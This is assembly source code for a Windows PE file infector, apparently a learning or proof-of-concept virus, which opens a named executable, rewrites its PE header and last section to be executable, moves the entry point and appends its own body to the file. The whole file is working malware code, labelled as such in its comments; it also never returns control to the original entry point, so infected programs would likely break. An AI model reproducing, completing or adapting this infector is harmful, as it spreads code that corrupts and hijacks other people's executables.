    .386
    .MODEL Flat, STDCALL
option casemap:none             ; Treat labels as case-sensitive
include    \masm32\include\windows.inc
include    \masm32\include\kernel32.inc
includelib    \masm32\lib\kernel32.lib
   
include    \masm32\include\user32.inc
includelib    \masm32\lib\user32.lib
        
.CODE
incode segment
start:
_start:
        call    delta
	delta:
            pop     ebp
            sub     ebp, offset delta
        call    infect_file
        push    0
        call    ExitProcess
;-------------------------------------------------------------------------------;
;-----------------------------------INFECTION-----------------------------------;
;-------------------------------------------------------------------------------;
        ;get file_data addr in stack
        infect_file:
            pushad
            file_open:                      
                push    0   ; NULL
                push    20h ; FILE_ATTRIBUTE_NORMAL
                push    3h  ; OPEN_EXISTING
                push    0   ; NULL
                push    1h  ; FILE_SHARE_READ
                push    0C0000000h  ; GENERIC_READ | GENERIC_WRITE
                lea     eax, [ebp + offset file_name] ;file_full_path
                push    eax
                call    CreateFileA ;params: LPTSTR file_name, DWORD desire_access, DWORD share_mode, LPSECURITY_ATTRIBUTES security, DWORD creation_disposition, DWORD flags_attributes, HANDLE template_file
                cmp     eax, 0FFFFFFFFh
                je      open_fail
                mov     [ebp + offset file_handle], eax ;save file_handle
                jmp     open_success
            open_fail:
                popad
                mov eax, 0FFFFFFFFh
                ret
            open_success:
                check_pe:
                    ;read magic word
                    push    00h;
                    lea     eax, [ebp + offset bytes_read]
                    push    eax ;bytes_read
                    push    02h ;bytes_to_read
                    mov     [ebp + offset data_dword], 00h ;clear data_dword bits
                    lea     eax, [ebp + offset data_dword]
                    push    eax ;buffer addr
                    push    [ebp + offset file_handle]
                    call    ReadFile
                    
                    ;compare
                    cmp     [ebp + offset data_dword], 5A4Dh
                    jne     open_fail
                read_pe_header:
                    ;seek to pe_header offset data
                    push    00h ;FILE_BEGIN
                    push    00h ;
                    push    3ch ;offset to pe_header offset data
                    push    [ebp + offset file_handle] ;HANDLE
                    call    SetFilePointer
                    
                    ;read pe header offset
                    push    00h
                    lea     eax, [ebp + offset bytes_read]
                    push    eax ;bytes_read
                    push    04h ;bytes_to_read
                    lea     eax, [ebp + offset pe_header]
                    push    eax ;pe_header addr
                    push    [ebp + offset file_handle]
                    call    ReadFile
                    
                    ;seek to pe_header offset
                    push    00h ;FILE_BEGIN
                    push    00h
                    push    [ebp + offset pe_header] ;offset to pe_header
                    push    [ebp + offset file_handle] ;HANDLE
                    call    SetFilePointer
                    
                    ;read pe_header_data
                    push    00h
                    lea     eax, [ebp + offset bytes_read]
                    push    eax
                    push    0f8h ;pe_header size
                    lea     eax, [ebp + offset pe_header_data]
                    push    eax ;pe_header_data addr
                    push    [ebp + offset file_handle]
                    call    ReadFile
                read_last_section:
                    ;get number of sections
                    mov     ebx, [ebp + offset pe_header_data + 06h] 
                    mov     eax, 00h
                    mov     ax, bx;
                    mov     [ebp + offset number_of_sections], eax
                    
                    ;calc last_section_header offset    
                    mov     eax, 00h ;clear eax register
                    mov     eax, [ebp + offset number_of_sections]
                    dec     eax ;subtract first section
                    mov     edx, 28h ;size of section header
                    mul     edx ;calc size of section headers to ignore
                    add     eax, [ebp + offset pe_header]
                    add     eax, 0f8h ;pe_header_offset + pe_header_size
                    mov     [ebp + offset last_section_header], eax
                    
                    ;seek to last_section_header offset
                    push    00h ;FILE_BEGIN
                    push    00h
                    push    [ebp + offset last_section_header] ;offset to pe_header
                    push    [ebp + offset file_handle] ;HANDLE
                    call    SetFilePointer
                    
                    ;read last_section_header_data
                    push    00h
                    lea     eax, [ebp + offset bytes_read]
                    push    eax
                    push    28h ;section_header size
                    lea     eax, [ebp + offset last_section_header_data]
                    push    eax ;last_section_header_data addr
                    push    [ebp + offset file_handle]
                    call    ReadFile
                init_data:
                    ;read entry_point
                    mov     eax, [ebp + offset pe_header_data + 28h]
                    mov     [ebp + offset entry_point], eax
                    
                    ;get section alignment
                    mov     eax, [ebp + offset pe_header_data + 38h]
                    mov     [ebp + offset section_alignment], eax
                    
                    ;calc malware_size
                    mov     eax, offset _end
                    sub     eax, offset _start
                    mov     [ebp + offset malware_size], eax

                    ;append_size = (size + section_alignment -1) / section_alignment * section_alignment                        
                    mov     eax, [ebp + offset malware_size]
                    add     eax, [ebp + offset section_alignment]
                    dec     eax
                    mov     edx, 00h ;clear edx register for division
                    mov     ebx, [ebp + offset section_alignment]
                    div     ebx
                    mul     ebx
                    mov     [ebp + offset append_size], eax
                    
                    ;append_pos = last_section_offset + last_section_size
                    mov     eax, [ebp + offset last_section_header_data + 14h]
                    add     eax, [ebp + offset last_section_header_data + 10h]
                    mov     [ebp + offset append_pos], eax
                modify_pe_header:                  
                    mov     eax, [ebp + offset append_size]
                    ;increase size of image
                    add     [ebp + offset pe_header_data + 50h], eax
                    ;increase size of code
                    add     [ebp + offset pe_header_data + 2ch], eax
                    ;increase size of initialized data
                    add     [ebp + offset pe_header_data + 20h], eax
                    ;change entry point
                    mov     eax, [ebp + offset last_section_header_data + 0ch]
                    add     eax, [ebp + offset last_section_header_data + 10h]
                    mov     [ebp + offset pe_header_data + 28h], eax ;entry point
                modify_last_section_header:
                    mov     eax, [ebp + offset append_size]
                    ;add flags
                    or      [ebp + offset last_section_header_data + 24h], 80000000h ;IMAGE_SCN_MEM_WRITE
                    or      [ebp + offset last_section_header_data + 24h], 40000000h ;IMAGE_SCN_MEM_READ
                    or      [ebp + offset last_section_header_data + 24h], 20000000h ;IMAGE_SCN_MEM_EXECUTE      
                    or      [ebp + offset last_section_header_data + 24h], 00000020h ;IMAGE_SCN_MEM_EXECUTE      
                    ;increase raw data size
                    add     [ebp + offset last_section_header_data + 10h], eax
                    ;increase virtual size
                    add     [ebp + offset last_section_header_data + 08h], eax
                override_pe_header:
                    ;seek to pe_header offset
                    push    00h ;FILE_BEGIN
                    push    00h
                    push    [ebp + offset pe_header]
                    push    [ebp + offset file_handle]
                    call    SetFilePointer
                    
                    ;override
                    push    00
                    lea     eax, [ebp + offset bytes_read]
                    push    eax
                    push    0f8h
                    lea     eax, [ebp + offset pe_header_data]
                    push    eax
                    push    [ebp + offset file_handle]
                    call    WriteFile
                override_last_section_header:
                    ;seek to last_section_header offset
                    push    00h ;FILE_BEGIN
                    push    00h
                    push    [ebp + offset last_section_header]
                    push    [ebp + offset file_handle]
                    call    SetFilePointer
                    
                    ;override
                    push    00
                    lea     eax, [ebp + offset bytes_read]
                    push    eax
                    push    28h
                    lea     eax, [ebp + offset last_section_header_data]
                    push    eax
                    push    [ebp + offset file_handle]
                    call    WriteFile
                inject_malware:
                    ;seek to malware pos
                    push    00h ;FILE_BEGIN
                    push    00h
                    push    [ebp + offset append_pos]
                    push    [ebp + offset file_handle]
                    call    SetFilePointer
                    
                    ;override
                    push    00
                    lea     eax, [ebp + offset bytes_read]
                    push    eax
                    push    [ebp + offset malware_size]
                    lea     eax, [ebp + offset _start]
                    push    eax
                    push    [ebp + offset file_handle]
                    call    WriteFile
                close_file:
                    push    [ebp + offset file_handle]
                    call    CloseHandle
            inject_end:
                popad
                mov     eax, 1h
                ret
        this_file_handle                dd      ?
        file_handle                     dd      ?
        bytes_read                      dd      ?
        data_buffer                     db      256 dup(?)
        data_dword                      dd      ?
        
        entry_point                     dd      ?
        number_of_sections              dd      ?
        section_alignment               dd      ?
        pe_header                       dd      ?
        pe_header_data                  db      0f8h dup(?)
        last_section_header             dd      ?
        last_section_header_data        db      28h dup(?)
        
        malware_size                    dd      ?
        append_size                     dd      ?
        append_pos                      dd      ?
        
        file_name                       db      "asd_release_o.exe",0
_end:
incode ends
end start